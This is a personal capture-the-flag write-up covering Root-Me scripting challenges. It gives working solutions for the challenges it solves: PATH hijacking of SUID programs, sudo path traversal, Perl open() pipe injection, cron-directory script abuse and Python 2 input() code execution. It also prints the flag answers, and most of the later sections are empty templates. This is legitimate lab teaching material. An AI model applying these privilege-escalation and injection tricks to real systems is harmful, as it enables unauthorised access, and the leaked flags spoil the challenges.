# [Root-Me](./rootme.md) Root-Me App - Script Challenges [6/25]

Exploit environment weaknesses, configuration mistakes and vulnerability patterns in scripts and systems. 

## Contents

1. [Bash - System 1](#bash-system-1) 🗸
2. [sudo - weak configuration](#sudo-weak-configuration) 🗸
3. [Bash - System 2](#bash-system-2) 🗸
4. [LaTeX - Input](#latex-input)
5. [Powershell - Command Injection](#powershell-command-injection)
6. [Bash - unquoted expression injection](#bash-unquoted-expression-injection)
7. [Perl - Command injection](#perl-command-injection) 🗸
8. [Powershell - SecureString](#powershell-securestring)
9. [Bash - cron](#bash-cron) 🗸
10. [LaTeX - Command execution](#latex-command-execution)
11. [Python - input()](#python-input) 🗸
12. [Bash - quoted expression injection](#bash-quoted-expression)
13. [Bash - race condition](#bash-race-condition)
14. [Powershell - Basic jail](#powershell-basic-jail)
15. [Python - pickle](#python-pickle)
16. [Shared Objects hijacking](#shared-objects-hijacking)
17. [SSH - Agent Hijacking](#ssh-agent-hijacking)
18. [Python - format string](#python-format-string)
19. [Python - PyJail](#python-pyjail-1)
20. [PHP - Jail](#php-jail)
21. [Python - PyJail](#python-pyjail-2)
22. [Python - Jail - Exec](#python-jail-exec)
23. [Javascript - Jail](#javascript-jail)
24. [Python - Jail - Garbage collector](#python-jail-garbage-collector)
25. [Bash - Restricted shells ](#bash-restricted-shells)

---

### [App - Script](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## Bash System 1

- Author: Lu33Y
- Date: 08 February 2012
- Points: 5
- Level: 1

### Statement

Source Code:

~~~c
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main(void)
{
  setreuid(geteuid(), geteuid());
  system("ls /challenge/app-script/ch11/.passwd");
  return 0;
}
~~~

### Connection Details

- Host: challenge02.root-me.org
- Protocol: SSH
- Port: 2222
- SSH access: ssh -p 2222 app-script-ch11@challenge02.root-me.org
- Username: app-script-ch11
- Password: app-script-ch11

### Resources

1. [Dangers of SUID Shell Scripts](https://repository.root-me.org/Administration/Unix/EN%20-%20Dangers%20of%20SUID%20Shell%20Scripts.pdf).
2. [SUID Priviledged Programs](https://repository.root-me.org/Administration/Unix/EN%20-%20SUID%20Privileged%20Programs.pdf).

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

We can connect to the challenge server:
  
~~~shell
$ ssh -p 2222 app-script-ch11@challenge02.root-me.org
~~~
  
Once connected, we can look for the flag:
  
~~~shell
app-script-ch11@challenge02:~$ ls
ch11  ch11.c  Makefile
app-script-ch11@challenge02:~$ pwd
/challenge/app-script/ch11
app-script-ch11@challenge02:~$ strings .passwd
strings: .passwd: Permission denied
~~~

We obviously need to more clever. We can see from the c source code that the program calls the ls program without the complete path to the binary (/bin/ls).  We can simply copy the cat binary to a temporary directory and set the PATH variable to point to the new program:
  
~~~shell
app-script-ch11@challenge02:~$ cp /bin/cat /var/tmp/ls
app-script-ch11@challenge02:~$ PATH=/var/tmp:$PATH ./ch11
!oPe96a/.s8d5
~~~
  
</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~
!oPe96a/.s8d5
~~~

</details>

---

### [App - Script](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## sudo weak configuration

- Author: notfound404
- Date: 6 February 2012
- Points: 5
- Level: 1

### Statement

Wishing to simplify the task by not modifying rights, the administrator has not thought about the side effects ...

### Connection Details

- Host: challenge02.root-me.org
- Protocol: SSH
- Port: 2222
- SSH access: ssh -p 2222 app-script-ch1@challenge02.root-me.org
- Username: app-script-ch1
- Password: app-script-ch1

### Resources

1. [sudo you are doing it wrong](https://repository.root-me.org/Administration/Unix/EN%20-%20sudo%20you%20are%20doing%20it%20wrong.pdf).

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

We can connect to the challenge server:
  
~~~shell
$ ssh -p 2222 app-script-ch11@challenge02.root-me.org
~~~
  
We can look at the current directory:
  
~~~shell
app-script-ch1@challenge02:~$ ls
ch1cracked  notes  readme.md
app-script-ch1@challenge02:~$ pwd
/challenge/app-script/ch1
~~~
  
The task suggests that this challenge is related to a weak sudo policy.  Let us look at the sudo policy:

~~~shell
app-script-ch1@challenge02:~$ sudo -l
Matching Defaults entries for app-script-ch1 on challenge02:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, !mail_always, !mail_badpass, !mail_no_host, !mail_no_perms, !mail_no_user

User app-script-ch1 may run the following commands on challenge02:
    (app-script-ch1-cracked) /bin/cat /challenge/app-script/ch1/notes/*
~~~

We can see we can run sudo as another user, app-script-ch1-cracked to execute /bin/cat in directory /challenge/app-script/ch1/notes/*.  The flag is in /challenge/app-script/ch1/ch1cracked; we can use this to read the .passwd file:
  
~~~shell
app-script-ch1@challenge02:~$ sudo -u app-script-ch1-cracked /bin/cat /challenge/app-script/ch1/notes/../ch1cracked/.passwd
b3_c4r3ful_w1th_sud0
~~~

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~
b3_c4r3ful_w1th_sud0
~~~

</details>

---

### [App - Script](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## bash system 2

- Author: Lu33Y
- Date: 8 February 2012
- Points: 10
- Level: 1

### Statement

Source Code

~~~c
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
     
int main(){
  setreuid(geteuid(), geteuid());
  system("ls -lA /challenge/app-script/ch12/.passwd");
  return 0;
}
~~~

### Connection Details

- Host: challenge02.root-me.org
- Protocol: SSH
- Port: 2222
- SSH access: ssh -p 2222 app-script-ch12@challenge02.root-me.org
- Username: app-script-ch12
- Password: app-script-ch12

### Resources

1. [section-7.html](http://www.faqs.org/faqs/unix-faq/faq/part4/section-7.html)

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

We can connect to the server:
  
~~~shell
$ ssh -p 2222 app-script-ch12@challenge02.root-me.org
~~~
  
We can review the local directory and files:
  
~~~shell
app-script-ch12@challenge02:~$ ls
ch12  ch12.c
app-script-ch12@challenge02:~$ pwd
/challenge/app-script/ch12
app-script-ch12@challenge02:~$ cat ch12.c
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main(){
    setreuid(geteuid(), geteuid());
    system("ls -lA /challenge/app-script/ch12/.passwd");
    return 0;
}
~~~

This shows the executable calls the ls command which we can see:
  
~~~shell
$ ./ch12 
-r--r----- 1 app-script-ch12-cracked app-script-ch12-cracked 14 Dec 10 14:14 /challenge/app-script/ch12/.passwd
~~~

We need to change the ls command to do something more sinister.  CAT is unavailable, strings does not handle the -l flag lets use vim instead:

~~~shell
app-script-ch12@challenge02:~$ cp /usr/bin/less /tmp/ls
~~~

We can now change the PATH and run:
  
~~~shell
app-script-ch12@challenge02:~$ export PATH=/tmp:$PATH
app-script-ch12@challenge02:~$ ./ch12
~~~
 
This returns the password
  
</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~
8a95eDS/*e_T#
~~~

</details>

---

### [App - Script](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## latex input

- Author: Podalirus, Mhd_Root
- Date: 17 March 2021
- Points: 10
- Level: 1

### Statement

Do you know how the input command works?

<details>

<summary markdown="span">Source Code</summary>

~~~bash
    #!/usr/bin/env bash
     
    if [[ $# -ne 1 ]]; then
        echo "Usage : ${0} TEX_FILE"
    fi
     
    if [[ -f "${1}" ]]; then
        TMP=$(mktemp -d)
        cp "${1}" "${TMP}/main.tex"
     
        # Compilation
        echo "[+] Compilation ..."
        timeout 5 /usr/bin/pdflatex \
            -halt-on-error \
            -output-format=pdf \
            -output-directory "${TMP}" \
            -no-shell-escape \
            "${TMP}/main.tex" > /dev/null
     
        timeout 5 /usr/bin/pdflatex \
            -halt-on-error \
            -output-format=pdf \
            -output-directory "${TMP}" \
            -no-shell-escape \
            "${TMP}/main.tex" > /dev/null
     
        chmod u+w "${TMP}/main.tex"
        rm "${TMP}/main.tex"
        chmod 750 -R "${TMP}"
        if [[ -f "${TMP}/main.pdf" ]]; then
            echo "[+] Output file : ${TMP}/main.pdf"
        else
            echo "[!] Compilation error, your logs : ${TMP}/main.log"
        fi
    else
        echo "[!] Can't access file ${1}"
    fi
~~~

</details>

### Connection Details

- Host: challenge02.root-me.org
- Protocol: SSH
- Port: 2222
- SSH access: ssh -p 2222 app-script-ch23@challenge02.root-me.org
- Username: app-script-ch23
- Password: app-script-ch23

### Resources

1. [Latex Cheat Sheet](https://repository.root-me.org/Programmation/Latex/EN%20-%20Latex%20Cheat%20Sheet.pdf).
2. [Latex Guide](https://repository.root-me.org/Programmation/Latex/EN%20-%20Latex%20Guide.pdf).

### Solutions

<details>

<summary markdown="span">Solution</summary>

We can connect to the challenge server using ssh:

~~~shell
$ ssh -p 2222 app-script-ch23@challenge02.root-me.org
~~~

We can see the /tmp and /var/tmp directories are writable.
  
Reviewing the source code we can see this will take a tex file input and generate a pdf.  Let's make a simple tex file in /tmp:
  
~~~shell
$vim
  :edit /tmp/test.tex
~~~
  
Our tex file:

~~~
\documentclass[12pt]{article}

\begin{document}

\section*{What is the password?}

The password is in /challenge/app-script/ch23/.passwd

\end{document}
~~~
  
We can compile it using the ch23.sh bash script:

~~~shell
app-script-ch23@challenge02:~$ ./ch23.sh /tmp/test.tex
[+] Compilation ...
[+] Output file : /tmp/tmp.3dMDb4qjob/main.pdf
~~~
  
We can see the pdf with the auxiliary and log files:

~~~shell
app-script-ch23@challenge02:~$ ls /tmp/tmp.3dMDb4qjob
main.aux  main.log  main.pdf
~~~
  
We can retrieve the file from our local machine using rsync:

~~~shell
$ rsync -e "ssh -p 2222" -avz app-script-ch23@challenge02.root-me.org:/tmp/tmp.3dMDb4qjob ~/Downloads
~~~

All looks good.  How do we open the .passwd file from LaTeX?  Let's try include and input:

~~~
\documentclass[12pt]{article}

\begin{document}

\section*{What is the password?}

The password is in /challenge/app-script/ch23/.passwd

\subsection*{Include command}
Include command returns:\\
\include{/challenge/app-script/ch23/.passwd}

\subsection*{Input command}
Input command returns:\\
\input{/challenge/app-script/ch23/.passwd}

\end{document}
~~~

Recompile:

~~~shell
app-script-ch23@challenge02:~$ ./ch23.sh /tmp/test.tex
[+] Compilation ...

/usr/bin/pdflatex: Not writing to /challenge/app-script/ch23/.passwd.aux (openout_any = p).

/usr/bin/pdflatex: Not writing to /challenge/app-script/ch23/.passwd.aux (openout_any = p).
[+] Output file : /tmp/tmp.tOJiNUPTQW/main.pdf
~~~

This returns a corrupt pdf.  Let's try just the input command:

~~~
\documentclass[12pt]{article}

\begin{document}

\section*{What is the password?}

The password is in /challenge/app-script/ch23/.passwd

\subsection*{Input command}
Input command returns:\\
\input{/challenge/app-script/ch23/.passwd}

\end{document}
~~~

The compiler will try to open the passwd file but it fails:

~~~shell
app-script-ch23@challenge02:~$ ./ch23.sh /tmp/test.tex
[+] Compilation ...
/challenge/app-script/ch23/.passwd: Permission denied
/challenge/app-script/ch23/.passwd: Permission denied
[!] Compilation error, your logs : /tmp/tmp.EePjlHYI8I/main.log
~~~

Perhaps there is an alternative package we can use?  We can look for all directories used by tex for compiling:
  
~~~shell
https://0day.work/hacking-with-latex/
~~~

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~

~~~

</details>

---

### [App - Script](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## powershell command injection

- Author: name
- X Points

### Description

Description Here

### Hints

1. Hint 1

### Connection Details

1. Detail 1

### Attachments

1. Attachment 1

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Detail here

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~

~~~

</details>

---

### [App - Script](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## bash unquoted expression

- Author: name
- X Points

### Description

Description Here

### Hints

1. Hint 1

### Connection Details

1. Detail 1

### Attachments

1. Attachment 1

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Detail here

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~

~~~

</details>

---

### [App - Script](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## Perl Command injection

- Author: Tosh
- Date: 11 August 2015
- Points: 15
- Level: 2

### Description

Retrieve the password stored in .passwd.


<details>

<summary markdown="span">Source Code</summary>

~~~
#!/usr/bin/perl
     
delete @ENV{qw(IFS CDPATH ENV BASH_ENV)};
$ENV{'PATH'}='/bin:/usr/bin';
     
use strict;
use warnings;
     
main();
     
sub main {
  my ($file, $line) = @_;
     
  menu();
  prompt();
     
  while((my $file = <STDIN>)) {
    chomp $file; 
    process_file($file);
    prompt();
  }
}
     
sub prompt {
  local $| = 1;
  print ">>> ";
}
sub menu {
  print "*************************\n";
  print "* Stat File Service    *\n";
  print "*************************\n";
}
     
sub check_read_access {
  my $f = shift;
  if(-f $f) {
    my $filemode = (stat($f))[2];
    return ($filemode & 4);
  }
  return 0;
}
     
sub process_file {
  my $file = shift;
  my $line;
  my ($line_count, $char_count, $word_count) = (0,0,0);
     
  $file =~ /(.+)/;
  $file = $1;
  if(!open(F, $file)) {
    die "[-] Can't open $file: $!\n";
  }
     
     
  while(($line = <F>)) {
    $line_count++;
    $char_count += length $line;
    $word_count += scalar(split/\W+/, $line);
  }
     
  print "~~~ Statistics for \"$file\" ~~~\n";
  print "Lines: $line_count\n";
  print "Words: $word_count\n";
  print "Chars: $char_count\n";
  close F;
}
~~~

</details>

### Resources

1. [sips.html](https://www.cgisecurity.com/lib/sips.html)

### Connection Details

- Host: challenge02.root-me.org
- Protocol: SSH
- Port: 2222
- SSH Access: ssh -p 2222 app-script-ch7@challenge02.root-me.org
- app-script-ch7
- app-script-ch7

### Attachments

None

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

This is a simple challenge that can workaround the file permissions:
 
~~~shell
app-script-ch7@challenge02:~$ ls
ch7.pl  setuid-wrapper  setuid-wrapper.c
app-script-ch7@challenge02:~$ ./setuid-wrapper 
*************************
* Stat File Service    *
*************************
>>> cat .passwd
[-] Can't open cat .passwd: No such file or directory
app-script-ch7@challenge02:~$ ./setuid-wrapper 
*************************
* Stat File Service    *
*************************
>>> cat .passwd >&2 |
PerlCanDoBetterThanYouThink
~~~ Statistics for "cat .passwd >&2 |" ~~~
Lines: 0
Words: 0
Chars: 0
>>> 
Use of uninitialized value $file in open at /challenge/app-script/ch7/ch7.pl line 55, <STDIN> line 2.
Use of uninitialized value $file in concatenation (.) or string at /challenge/app-script/ch7/ch7.pl line 56, <STDIN> line 2.
[-] Can't open : No such file or directory
~~~

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~
PerlCanDoBetterThanYouThink
~~~

</details>

---

### [App - Script](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## powershell secure string

- Author: name
- X Points

### Description

Description Here

### Hints

1. Hint 1

### Connection Details

1. Detail 1

### Attachments

1. Attachment 1

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Detail here

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~

~~~

</details>

---

### [App - Script](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## bash cron

- Author: g0uZ
- Date: 06 May 2013
- Points: 20
- Level: 2

### Description

Connection Information:
 
- Host: challenge02.root-me.org
- Protocol: SSH
- Port: 2222
- SSH Access: ssh -p 2222 app-script-ch4@challenge02.root-me.org
- Username: app-script-ch4
- Password: app-script-ch4

### Attachments

1. Attachment 1

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Connecting to the challenge server we find python, perl, gcc, netcat, gdb, gdb-peda, gdb-gef, gdb-pwndbg, ROPgadget, radare2 are all available to the user and the password is stored in ~/.passwd:

~~~shell
$ ssh -p 2222 app-script-ch4@challenge02.root-me.org
      _           _ _                        ___ ____  
  ___| |__   __ _| | | ___ _ __   __ _  ___ / _ \___ \ 
 / __| '_ \ / _` | | |/ _ \ '_ \ / _` |/ _ \ | | |__) |
| (__| | | | (_| | | |  __/ | | | (_| |  __/ |_| / __/ 
 \___|_| |_|\__,_|_|_|\___|_| |_|\__, |\___|\___/_____|
                                 |___/ root-me.org     

app-script-ch4@challenge02.root-me.org's password: 
     
                                     ██▒ ▒██░    
                                 ░███░ █ █ ░███▒    
                             ░███░        ▓     ███░    
                           ▓█▓       ▓█░  ▓       ▓███    
                         ██▒     ░▓█▓███  ▓   ██  █▒ ░██    
                        ██  ███  ▒░       ▓░████░██    ▓█░    
                       ██   ▒██      ███      ░▓██      ▒█    
                      ██             ░█░      ░██        ▓█    
                     ░█████████████    █     ██░          █▓    
                     ██                 █ ░██             ██    
                     ██      ░         ░██▓               ██    
                     ██  ███    ░██▓░███                 ███    
                     ▒█          ▓██▓                  ░████    
                      █▓    ░████                    ░██ ▒█    
                      ▓█████░                      ███ ███▓    
                      ▓███                      █████░ ████    
                       ▓█     ░██▓░         ▒████████░  ██    
                       ▓█      ██░▒██████████████████░  ██    
                       ▓█       ███▓██▒  ░██████████░   ██    
                       ▓█                  ░████▒       ██    
                        ░██▓           ▒█▓           ▒██░    
                           ▒██░       ██ ▒█        ██▓    
                              █▒                  █    
                              █▒  ░█    █░   █▓   █    
                              █████████████████████    
     
 ████████████▄                             ██    ███             ███    
 ██          ██  ▄████████▄   ▄████████▄  ██████ ████           ████  ▄████████▄  
 ██          ██ ██        ██ ██        ██  ██    ██  ██       ██  ██ ██        ██  
 ████████████▀  ██        ██ ██        ██  ██    ██   ██     ██   ██ ████████████ 
 ██    ███      ██        ██ ██        ██  ██    ██     ██ ██     ██ ██    
 ██       ████   ▀████████▀   ▀████████▀   ██    ██       █       ██  ▀██████████ 


------------------------------------------------------------------------------------------------
    Welcome on challenge02    /
-----------------------------‘

/tmp and /var/tmp are writeable

Validation password is stored in $HOME/.passwd

Useful commands available:
    python, perl, gcc, netcat, gdb, gdb-peda, gdb-gef, gdb-pwndbg, ROPgadget, radare2

Attention:
    Publishing solutions publicly (blog, github, youtube, etc.) is forbidden.
    Publier des solutions publiquement (blog, github, youtube, etc.) est interdit.
~~

The directory includes the .passwd file, a ._perms permission list, .git and cron.d and ch4:

~~~shell
app-script-ch4@challenge02:~$ ls -a
.  ..  ch4  cron.d  .git  .passwd  ._perms
app-script-ch4@challenge02:~$ cat .passwd
cat: .passwd: Permission denied
~~~

We can view the ch4 bash file:

~~~shell
app-script-ch4@challenge02:~$ cat ch4
#!/bin/bash

# Sortie de la commande 'crontab -l' exécutée en tant que app-script-ch4-cracked:
# */1 * * * * /challenge/app-script/ch4/ch4
# Vous N'avez PAS à modifier la crontab(chattr +i t'façons)

# Output of the command 'crontab -l' run as app-script-ch4-cracked:
# */1 * * * * /challenge/app-script/ch4/ch4
# You do NOT need to edit the crontab (it's chattr +i anyway)

# hiding stdout/stderr
exec 1>/dev/null 2>&1

wdir="cron.d/"
challdir=${0%/*}
cd "$challdir"


if [ ! -e "/tmp/._cron" ]; then
    mkdir -m 733 "/tmp/._cron"
fi

ls -1a "${wdir}" | while read task; do
    if [ -f "${wdir}${task}" -a -x "${wdir}${task}" ]; then
    	timelimit -q -s9 -S9 -t 5 bash -p "${PWD}/${wdir}${task}"
    fi
    rm -f "${PWD}/${wdir}${task}"
done

rm -rf cron.d/*
~~~

We can add a bash script to the cron directory: 

~~~shell
$ vim cron.d/script.sh
~~~

With the following script:

~~~bash
#!/bin/bash
/bin/cat ../.passwd > /tmp/pwd20220425
~~~

Saving and running the ch4 bash script, we can recover the password from the new temporary file:

~~~shell
app-script-ch4@challenge02:~$ ./ch4 
app-script-ch4@challenge02:~$ cat /tmp/pwd20220425
Vys3OS3iStUapDj
~~~

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~
Vys3OS3iStUapDj
~~~

</details>

---

### [App - Script](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## latex command execution

- Author: name
- X Points

### Description

Description Here

### Hints

1. Hint 1

### Connection Details

1. Detail 1

### Attachments

1. Attachment 1

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Detail here

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~

~~~

</details>

---

### [App - Script](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## python input

- Author: g0uZ
- Date: 38 May 2014
- Point: 20
- Level: 2

### Description

Get the password in the .passwd file by exploiting a vulnerability in this python script.

<details>

<summary markdown="span">Source Code</summary>

~~~py
    #!/usr/bin/python2
     
    import sys
     
    def youLose():
        print "Try again ;-)"
        sys.exit(1)
     
     
    try:
        p = input("Please enter password : ")
    except:
        youLose()
     
     
    with open(".passwd") as f:
        passwd = f.readline().strip()
        try:
            if (p == int(passwd)):
                print "Well done ! You can validate with this password !"
        except:
            youLose()
~~~

</details>

### Connection Details

- Host: challenge02.root-me.org
- Protocol: SSH
- Port: 2222
- SSH access: ssh -p 2222 app-script-ch6@challenge02.root-me.org
- Username: app-script-ch6
- Password: app-script-ch6

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

This is a simple exploit that involves reading the password from the user input.  We can write a short input command to read the password file:

~~~py
sys.stdout.write(open(".passwd").readline())
~~~

We can run using the setuid-wrapper executable:

~~~shell
app-script-ch6@challenge02:~$ ls
ch6.py  setuid-wrapper  setuid-wrapper.c
app-script-ch6@challenge02:~$ ./setuid-wrapper 
Please enter password : sys.stdout.write(open(".passwd").readline())
13373439872909134298363103573901
~~~

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~
13373439872909134298363103573901
~~~

</details>

---

### [App - Script](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## bash quoted expression

- Author: name
- X Points

### Description

Description Here

### Hints

1. Hint 1

### Connection Details

1. Detail 1

### Attachments

1. Attachment 1

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Detail here

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~

~~~

</details>

---

### [App - Script](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## bash race condition

- Author: name
- X Points

### Description

Description Here

### Hints

1. Hint 1

### Connection Details

1. Detail 1

### Attachments

1. Attachment 1

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Detail here

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~

~~~

</details>

---

### [App - Script](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## powershell basic jail

- Author: name
- X Points

### Description

Description Here

### Hints

1. Hint 1

### Connection Details

1. Detail 1

### Attachments

1. Attachment 1

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Detail here

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~

~~~

</details>

---

### [App - Script](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## python pickle

- Author: name
- X Points

### Description

Description Here

### Hints

1. Hint 1

### Connection Details

1. Detail 1

### Attachments

1. Attachment 1

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Detail here

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~

~~~

</details>

---

### [App - Script](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## shared objects hijacking

- Author: name
- X Points

### Description

Description Here

### Hints

1. Hint 1

### Connection Details

1. Detail 1

### Attachments

1. Attachment 1

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Detail here

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~

~~~

</details>

---

### [App - Script](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## ssh agent hijacking

- Author: name
- X Points

### Description

Description Here

### Hints

1. Hint 1

### Connection Details

1. Detail 1

### Attachments

1. Attachment 1

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Detail here

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~

~~~

</details>

---

### [App - Script](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## python format string

- Author: name
- X Points

### Description

Description Here

### Hints

1. Hint 1

### Connection Details

1. Detail 1

### Attachments

1. Attachment 1

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Detail here

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~

~~~

</details>

---

### [App - Script](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## python pyjail 1

- Author: name
- X Points

### Description

Description Here

### Hints

1. Hint 1

### Connection Details

1. Detail 1

### Attachments

1. Attachment 1

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Detail here

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~

~~~

</details>

---

### [App - Script](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## php jail

- Author: name
- X Points

### Description

Description Here

### Hints

1. Hint 1

### Connection Details

1. Detail 1

### Attachments

1. Attachment 1

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Detail here

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~

~~~

</details>

---

### [App - Script](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## python pyjail 2

- Author: name
- X Points

### Description

Description Here

### Hints

1. Hint 1

### Connection Details

1. Detail 1

### Attachments

1. Attachment 1

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Detail here

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~

~~~

</details>

---

### [App - Script](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## python jail exec

- Author: name
- X Points

### Description

Description Here

### Hints

1. Hint 1

### Connection Details

1. Detail 1

### Attachments

1. Attachment 1

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Detail here

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~

~~~

</details>

---

### [App - Script](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## javascript jail

- Author: name
- X Points

### Description

Description Here

### Hints

1. Hint 1

### Connection Details

1. Detail 1

### Attachments

1. Attachment 1

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Detail here

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~

~~~

</details>

---

### [App - Script](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## python jail garbage collector

- Author: name
- X Points

### Description

Description Here

### Hints

1. Hint 1

### Connection Details

1. Detail 1

### Attachments

1. Attachment 1

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Detail here

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~

~~~

</details>

---

### [App - Script](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## bash restricted shells

- Author: name
- X Points

### Description

Description Here

### Hints

1. Hint 1

### Connection Details

1. Detail 1

### Attachments

1. Attachment 1

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Detail here

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~

~~~

</details>

---

### [App - Script](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---


Last updated Dec 2021.

## [djm89uk.github.io](https://djm89uk.github.io)
